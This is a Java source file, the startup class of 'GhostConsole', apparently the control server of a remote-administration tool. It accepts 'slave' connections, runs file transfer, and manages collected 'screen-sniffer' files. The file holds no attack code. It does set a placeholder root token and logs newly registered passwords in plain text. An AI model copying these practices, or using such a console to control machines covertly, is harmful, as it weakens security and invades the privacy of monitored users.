package top.idoknow.ghost.console.core;


import top.idoknow.ghost.console.adapter.jrer.JRERAdapter;
import top.idoknow.ghost.console.adapter.rft.RFTAdapter;
import top.idoknow.ghost.console.adapter.taglog.TagLogAdapter;
import top.idoknow.ghost.console.at.TimedTaskMgr;
import top.idoknow.ghost.console.authorize.TerminalAccountMgr;
import top.idoknow.ghost.console.ioutil.FileIO;
import top.idoknow.ghost.console.ioutil.log.LogMgr;
import top.idoknow.ghost.console.ioutil.SpaceCleaner;
import top.idoknow.ghost.console.ioutil.log.LogMySQL;
import top.idoknow.ghost.console.net.slave.SlaveAcceptor;
import top.idoknow.ghost.console.net.terminal.TerminalAcceptor;
import top.idoknow.ghost.console.subject.Subject;
import top.idoknow.ghost.console.util.TimeUtil;

import java.io.*;
import java.util.Date;
import java.util.PropertyResourceBundle;
import java.util.ResourceBundle;
import java.util.Timer;

/**
 * The Entrance of GhostConsole.
 * Initialize all modules and tasks.
 */
public class ConsoleMain{

    public final static long consoleStartTime=new Date().getTime();
    public static Subject bootingSub=new Subject("boot",Subject.CONSOLE);
    //Write this notice to the head of properties file.
    private static final String notice="#Edit this file to configure this console.\n" +
            "#Please notice that this software is not supposed to be a hacking tool,\n" +
            "#do not use this software in illegal ways.\n";
    //Write this default properties content to file if not exist.
    private static final String defProperties="" +
            "" +
            "slave-port=1033\n" +
            "terminal-port=1034\n" +
            "rft-server-port=1035\n" +
            "root-token=changeMe\n" +
            "log-file=console.log\n" +
            "log-buffer-size=100\n" +
            "log-flush-time=20000\n" +
            "enable-tag-log=false\n" +
            "slave-startup=\n" +
            "workdir-http-url=\n" +
            "enable-slave-ban=true\n" +
            "screen-sniffer-file-check-day=\n" +
            "screen-sniffer-file-timeout-day=28\n" +
            "enable-green-jre-management=false\n" +
            "debug-mode=false\n" +
            "enable-multi-account=true\n" +
            "save-online-slave-list-to=\n" +
            "log-to-mysql-address=\n" +
            "mysql-user=\n" +
            "mysql-password=\n" +
            "mysql-database=\n";

    //create properties file if not exist
    static {
        //check properties file
        //create it if not exist
        File propertiesFile=new File("console.properties");
        try {
            if (!propertiesFile.exists()||FileIO.read("console.properties").equals("")){
                try {
                    FileIO.write("console.properties"
                            ,notice+"" +
                                    "#Create time:"+ TimeUtil.nowMMDDHHmmSS()+"\n" +
                                    defProperties);
                    LogMgr.logMessage(bootingSub,"Properties","Properties file created,please edit it and restart software.");
                    stopConsole(0);
                } catch (Exception e) {
                    e.printStackTrace();
                    LogMgr.log(LogMgr.CRASH,bootingSub,"Properties","Failed to create properties.");
                    stopConsole(-1);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            LogMgr.log(LogMgr.CRASH,bootingSub,"Properties","Failed to check content of properties.");
            stopConsole(-1);
        }
    }

    //load properties from file
    public static ResourceBundle cfg;
    static {
        try {
            BufferedInputStream inputStream = new BufferedInputStream(new FileInputStream("console.properties"));
            cfg=new PropertyResourceBundle(inputStream);
            inputStream.close();
            LogMgr.log(LogMgr.INFO,bootingSub,"Properties","Properties loaded.");
        }catch (Exception loadProperties){
            loadProperties.printStackTrace();
            LogMgr.log(LogMgr.CRASH,bootingSub,"Properties","Failed to load properties.");
            stopConsole(-1);
        }
    }



    public static SlaveAcceptor slaveAcceptor=new SlaveAcceptor();
    public static TerminalAcceptor terminalAcceptor=new TerminalAcceptor();

    public static SpaceCleaner spaceCleaner=new SpaceCleaner();
    public static Timer spaceCleanTimer=new Timer();


    public static TimedTaskMgr timedTaskMgr=new TimedTaskMgr();

    public static final String LOGIN_TAG="l",ALIVE_TAG="a";

    public static void main(String[] args)throws Exception {
        //Check commands

        if (args.length>=1){
            if (args[0].equals("register")){
                if (args.length<3){
                    LogMgr.log(LogMgr.ERROR,bootingSub,"Account","Syntax:register <name> <password>");
                    stopConsole(-1);
                }
                TerminalAccountMgr.register(args[1],args[2]);
                LogMgr.logMessage(bootingSub,"Account","Registered:"+args[1]+" "+args[2]);
                stopConsole(0);
            }
        }


        //Enable log auto flushing
        LogMgr.scheduleAutoFlushTask(Long.parseLong(cfg.getString("log-flush-time")));

        LogMgr.logMessage(bootingSub,"Boot","Log auto flushing task scheduled:"
                +cfg.getString("log-flush-time")+"ms");

        initSlaveAcceptor();
        initTerminalAcceptor();

        RFTAdapter.init();
        LogMgr.logMessage(bootingSub,"Boot","RFT service is now running on port:"
                +RFTAdapter.rftServer.getPort());

        TagLogAdapter.init();
        LogMgr.logMessage(bootingSub,"Boot","TagLog loaded.Enable:"+cfg.getString("enable-tag-log"));

        TagLogAdapter.getTagLog().addTag(bootingSub.getToken(),LOGIN_TAG);
        TagLogAdapter.getTagLog().pack();


        JRERAdapter.init();
        LogMgr.logMessage(bootingSub,"Boot","JRE Register loaded.");

        if (!"".equalsIgnoreCase(cfg.getString("screen-sniffer-file-check-day"))){
            try {
                int day=Integer.parseInt(cfg.getString("screen-sniffer-file-check-day"));
                spaceCleanTimer.schedule(spaceCleaner,10000, 1000L*60*60*24*day);
                LogMgr.logMessage(bootingSub,"Boot","Scheduled space clean task for period:"+day+"d.");
            }catch (Exception e){
                LogMgr.log(LogMgr.CRASH,bootingSub,"Boot","Cannot load \"screen-sniffer-file-check-day\" from properties:"+getErrorInfo(e));
                stopConsole(-1);
            }
        }else {
            LogMgr.logMessage(bootingSub,"Boot","Auto space clean task is unable.");
        }


        if (TerminalAccountMgr.isMultiAccountEnable()){
            TerminalAccountMgr.loadFromFile();
            LogMgr.logMessage(bootingSub,"Boot","Loaded accounts from file("+TerminalAccountMgr.countAccounts()+").");
        }else {
            LogMgr.logMessage(bootingSub,"Boot","Multi-account is unable.");
        }

        if (LogMySQL.isEnable()){
            try {
                LogMySQL.init();
                LogMgr.logMessage(bootingSub, "Boot", "Connected to MySQL database:" + cfg.getString("log-to-mysql-address"));
            }catch (Exception e){
                e.printStackTrace();
                stopConsole(-1);
            }
        }else {
            LogMgr.logMessage(bootingSub,"Boot","Log-to-MySQL is unable.");
        }

    }

    public static void initSlaveAcceptor(){
        ConsoleMain.slaveAcceptor.start();
    }
    public static void initTerminalAcceptor(){
        ConsoleMain.terminalAcceptor.start();
    }

    public static void stopConsole(int status){
        try {
            LogMgr.flush(cfg.getString("log-file"));
        }catch (Exception ignored){}
        System.exit(status);
    }



    public static String getErrorInfo(Exception e){
        StringWriter sw=new StringWriter();
        PrintWriter pw=new PrintWriter(sw);
        e.printStackTrace(pw);
        return sw.toString().replaceAll("\t","    ");
    }
}
